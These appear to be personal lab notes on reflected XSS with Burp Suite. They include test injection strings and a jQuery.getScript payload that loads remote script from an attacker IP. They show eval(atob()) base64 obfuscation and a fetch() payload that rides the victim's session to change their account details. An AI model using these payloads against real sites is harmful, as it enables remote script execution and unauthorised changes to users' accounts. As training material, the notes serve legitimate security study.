# Reflected XSS
- Vulnerable where user input is sent via GET parameters
- may need to be URL encoded

### HTML Injection Test

```html
<h1>TEST</h1>
```


### JavaScript Injection Test

```javascript
<script>alert(0)</script>
```


### Exploiting With Burp Suite
1) submit the payload with intercept off.
```bash
<script>alert(0)</script>
```

2) Close the alert box, then go to the 'HTTP history' tab and locate the Request.

3) Verify payload was reflected directly in the content (Raw) in the Response.


## Burp Suite Javascript Injection

### View JavaScript libraries in use
- Target > Site Map
- verify one of the libraries uses "_jQuery.getScript()_"

##### test payload to verify it works
```xss.js
alert('It worked!');
```

##### Start listener
```python
python3 -m http.server 80
```

##### Craft the payload
```raw
jQuery.getScript('http://[ATTACKER_IP]/xss.js')
```

##### Encoding with base64

##### Make it readable
- atob()
	- javascript function to decode base64
- eval()
	- executes javascript
```raw
# using + because it blocks ;
'+eval(atob(`[B64STRING]`))+'

#or

# using btoa() to encode the whole requeset
'+btoa(eval(atob('[B64STRING]')))+'
```

##### Execute

##### Modifying Forms
- Use burp suite to grab a sample request after submitting changes to an input field
	- use repeater to remove session id information to see if its required

- sample post request
```raw
OST /card/stop/updateAddress.html HTTP/1.1
Host: cardz:8222
Content-Length: 161
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://site:8222
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: .html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: navigate-tinymce-scroll=%7B%7D; navigate-language=en; cookieconsent_status=dismiss; JSESSIONID=626462846266662D; user=DEFAULT_jim.janes@local.host
Connection: close

customerId=100&billingAddress=false&firstName=z&lastName=z&company=&address=z&city=z&country=AL&stateProvince=z&postalCode=z&phone=z&submitAddress=Change+address
```

- sample request modification (xss.js)
```xss.js
# same-origin means use already logged in credentials (authenticated)
fetch('http://site:8222/card/stop/updateAddress.html',{
	method: 'POST',
	mode: 'same-origin',
	credentials: 'same-origin',
	headers: {
		'Content-Type':'application/x-www-form-urlencoded'
	},
body:'customerId=&billingAddress=false&firstName=hax&lastName=hax&company=&address=hax&city=hax&country=AL&stateProvince=z&postalCode=z&phone=z&submitAddress=Change address'
})
```

### Resolving Errors
- verify payload is formatted correctly

- error after alert?
	-  Click the link to view the issue
	- message: invalid characters found
	- attempt base64 encoding the entire response using btoa() 